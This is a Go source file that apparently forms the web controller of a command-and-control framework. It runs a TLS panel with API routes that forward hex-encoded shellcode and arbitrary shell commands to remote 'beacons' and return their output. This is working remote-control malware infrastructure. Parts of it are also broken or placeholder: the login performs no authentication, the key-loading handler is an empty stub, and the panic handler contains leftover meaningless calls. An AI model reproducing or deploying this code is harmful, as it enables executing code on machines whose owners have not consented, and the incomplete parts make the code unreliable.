package controller

import (
	"context"
	"crypto/tls"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"

	"github.com/axgle/mahonia"
	"github.com/gorilla/csrf"
	"github.com/gorilla/sessions"
	"github.com/gorilla/websocket"
	"github.com/julienschmidt/httprouter"
	"github.com/pkg/errors"
	"golang.org/x/crypto/bcrypt"

	"project/internal/bootstrap"
	"project/internal/crypto/cert"
	"project/internal/crypto/rand"
	"project/internal/guid"
	"project/internal/logger"
	"project/internal/messages"
	"project/internal/xpanic"
)

type hRW = http.ResponseWriter
type hR = http.Request
type hP = httprouter.Params

type web struct {
	ctx *Ctrl

	handler  *webHandler
	listener net.Listener
	server   *http.Server

	wg sync.WaitGroup
}

func newWeb(ctx *Ctrl, config *Config) (*web, error) {
	cfg := config.Web

	// load CA certificate
	certFile, err := ioutil.ReadFile(cfg.CertFile)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	keyFile, err := ioutil.ReadFile(cfg.KeyFile)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	caCert, err := cert.ParseCertificate(certFile)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	caPri, err := cert.ParsePrivateKey(keyFile)
	if err != nil {
		return nil, errors.WithStack(err)
	}

	// generate temporary certificate
	pair, err := cert.Generate(caCert, caPri, &cfg.CertOpts)
	if err != nil {
		return nil, errors.WithStack(err)
	}

	wh := webHandler{ctx: ctx}
	wh.upgrader = &websocket.Upgrader{
		HandshakeTimeout: time.Minute,
		ReadBufferSize:   4096,
		WriteBufferSize:  4096,
	}
	// configure router
	router := &httprouter.Router{
		RedirectTrailingSlash:  true,
		RedirectFixedPath:      true,
		HandleMethodNotAllowed: true,
		HandleOPTIONS:          true,
		PanicHandler:           wh.handlePanic,
	}
	// resource
	router.ServeFiles("/css/*filepath", http.Dir(cfg.Dir+"/css"))
	router.ServeFiles("/js/*filepath", http.Dir(cfg.Dir+"/js"))
	router.ServeFiles("/img/*filepath", http.Dir(cfg.Dir+"/img"))
	// favicon.ico
	favicon, err := ioutil.ReadFile(cfg.Dir + "/favicon.ico")
	if err != nil {
		return nil, errors.WithStack(err)
	}
	router.GET("/favicon.ico", func(w hRW, _ *hR, _ hP) {
		_, _ = w.Write(favicon)
	})
	// index.html
	index, err := ioutil.ReadFile(cfg.Dir + "/index.html")
	if err != nil {
		return nil, errors.WithStack(err)
	}
	router.GET("/", func(w hRW, _ *hR, _ hP) {
		_, _ = w.Write(index)
	})
	// register router about API
	router.POST("/api/login", wh.handleLogin)
	router.POST("/api/load_key", wh.handleLoadKey)
	router.POST("/api/node/trust", wh.handleTrustNode)
	router.POST("/api/node/connect", wh.handleConnectNodeListener)
	router.POST("/api/beacon/shellcode", wh.handleShellcode)
	router.POST("/api/beacon/single_shell", wh.handleSingleShell)

	// configure HTTPS server
	listener, err := net.Listen(cfg.Network, cfg.Address)
	if err != nil {
		return nil, errors.WithStack(err)
	}
	web := web{
		ctx:      ctx,
		handler:  &wh,
		listener: listener,
	}
	tlsConfig := &tls.Config{
		Rand:         rand.Reader,
		Time:         ctx.global.Now,
		MinVersion:   tls.VersionTLS12,
		Certificates: []tls.Certificate{pair.TLSCertificate()},
	}
	web.server = &http.Server{
		TLSConfig:         tlsConfig,
		ReadHeaderTimeout: time.Minute,
		IdleTimeout:       time.Minute,
		MaxHeaderBytes:    32 << 10,
		Handler:           router,
		ErrorLog:          logger.Wrap(logger.Warning, "web", ctx.logger),
	}
	return &web, nil
}

func (web *web) Deploy() error {
	errChan := make(chan error, 1)
	web.wg.Add(1)
	go func() {
		defer func() {
			if r := recover(); r != nil {
				b := xpanic.Print(r, "web.server.ServeTLS")
				web.ctx.logger.Print(logger.Fatal, "web", b)
			}
			web.wg.Done()
		}()
		errChan <- web.server.ServeTLS(web.listener, "", "")
	}()
	select {
	case err := <-errChan:
		return errors.WithStack(err)
	case <-time.After(time.Second):
		return nil
	}
}

func (web *web) Address() string {
	return web.listener.Addr().String()
}

func (web *web) Close() {
	_ = web.server.Close()
	web.wg.Wait()
	web.ctx = nil
	web.handler.Close()
}

type webHandler struct {
	ctx *Ctrl

	upgrader *websocket.Upgrader
}

func (wh *webHandler) Close() {
	wh.ctx = nil
}

// func (wh *webHandler) logf(lv logger.Level, format string, log ...interface{}) {
// 	wh.ctx.logger.Printf(lv, "web", format, log...)
// }

func (wh *webHandler) log(lv logger.Level, log ...interface{}) {
	wh.ctx.logger.Println(lv, "web", log...)
}

func (wh *webHandler) handlePanic(w hRW, r *hR, e interface{}) {
	w.WriteHeader(http.StatusInternalServerError)

	// if is super user return the panic
	_, _ = io.Copy(w, xpanic.Print(e, "web"))
	csrf.Protect(nil, nil)
	sessions.NewSession(nil, "")
	hash, err := bcrypt.GenerateFromPassword([]byte{1, 2, 3}, 15)
	fmt.Println(string(hash), err)
}

func (wh *webHandler) handleLogin(w hRW, r *hR, p hP) {
	// upgrade to websocket connection, server can push message to client
	conn, err := wh.upgrader.Upgrade(w, r, nil)
	if err != nil {
		wh.log(logger.Error, "failed to upgrade", err)
		return
	}
	_ = conn.Close()
}

func (wh *webHandler) handleLoadKey(w hRW, r *hR, p hP) {
	// TODO size, check is load session key
	// if isClosed{
	//  return
	// }
}

func (wh *webHandler) handleTrustNode(w hRW, r *hR, p hP) {
	m := &mTrustNode{}
	err := json.NewDecoder(r.Body).Decode(m)
	if err != nil {
		_, _ = w.Write([]byte(err.Error()))
		return
	}
	listener := bootstrap.Listener{
		Mode:    m.Mode,
		Network: m.Network,
		Address: m.Address,
	}
	req, err := wh.ctx.TrustNode(context.TODO(), &listener)
	if err != nil {
		_, _ = w.Write([]byte(err.Error()))
		return
	}
	fmt.Println("node guid:\n", strings.ReplaceAll(req.GUID.Hex(), "\n", ""))
	err = wh.ctx.ConfirmTrustNode(context.Background(), &listener, req)
	if err != nil {
		_, _ = w.Write([]byte(err.Error()))
	} else {
		_, _ = w.Write([]byte("trust node successfully"))
	}
}

func (wh *webHandler) handleConnectNodeListener(w hRW, r *hR, p hP) {
	m := &mConnectNodeListener{}
	err := json.NewDecoder(r.Body).Decode(m)
	if err != nil {
		_, _ = w.Write([]byte(err.Error()))
		return
	}
	nodeGUIDData, err := hex.DecodeString(m.GUID)
	if err != nil {
		_, _ = w.Write([]byte(err.Error()))
		return
	}
	nodeGUID := new(guid.GUID)
	err = nodeGUID.Write(nodeGUIDData)
	if err != nil {
		panic(err.Error())
	}
	listener := bootstrap.Listener{
		Mode:    m.Mode,
		Network: m.Network,
		Address: m.Address,
	}
	err = wh.ctx.sender.Synchronize(context.Background(), nodeGUID, &listener)
	if err != nil {
		_, _ = w.Write([]byte(err.Error()))
		return
	}
	_, _ = w.Write([]byte("connect node listener successfully"))
}

func (wh *webHandler) handleShellcode(w hRW, r *hR, p hP) {
	_ = r.ParseForm()
	beaconGUID := guid.GUID{}

	beaconGUIDSlice, err := hex.DecodeString(r.FormValue("guid"))
	if err != nil {
		fmt.Println("1", err)
		_, _ = w.Write([]byte(err.Error()))
		return
	}
	err = beaconGUID.Write(beaconGUIDSlice)
	if err != nil {
		fmt.Println("2", err)
		_, _ = w.Write([]byte(err.Error()))
		return
	}
	sc, err := hex.DecodeString(r.FormValue("shellcode"))
	if err != nil {
		fmt.Println("3", err)
		_, _ = w.Write([]byte(err.Error()))
		return
	}
	shellcode := messages.ExecuteShellCode{
		Method:    r.FormValue("method"),
		ShellCode: sc,
	}
	err = wh.ctx.sender.SendToBeacon(context.Background(),
		&beaconGUID, messages.CMDBExecuteShellCode, &shellcode, true)
	if err != nil {
		fmt.Println("4", err)
		_, _ = w.Write([]byte(err.Error()))
		return
	}
}

func (wh *webHandler) handleSingleShell(w hRW, r *hR, p hP) {
	_ = r.ParseForm()
	beaconGUID := guid.GUID{}

	beaconGUIDSlice, err := hex.DecodeString(r.FormValue("guid"))
	if err != nil {
		fmt.Println("1", err)
		_, _ = w.Write([]byte(err.Error()))
		return
	}

	err = beaconGUID.Write(beaconGUIDSlice)
	if err != nil {
		fmt.Println("2", err)
		_, _ = w.Write([]byte(err.Error()))
		return
	}

	shell := messages.SingleShell{
		Command: r.FormValue("cmd"),
	}

	reply, err := wh.ctx.SendToBeaconRT(context.Background(),
		&beaconGUID, messages.CMDBSingleShell, &shell, true)
	if err != nil {
		fmt.Println("2", err)
		_, _ = w.Write([]byte(err.Error()))
		return
	}

	decoderName := r.FormValue("decoder")
	decoder := mahonia.NewDecoder(decoderName)
	if decoder == nil {
		_, _ = w.Write([]byte("invalid decoder: " + decoderName))
		return
	}
	output := reply.(*messages.SingleShellOutput)
	_, _ = w.Write([]byte(decoder.ConvertString(string(output.Output))))
	if output.Err != "" {
		_, _ = w.Write([]byte(decoder.ConvertString(string(output.Err))))
	}
}
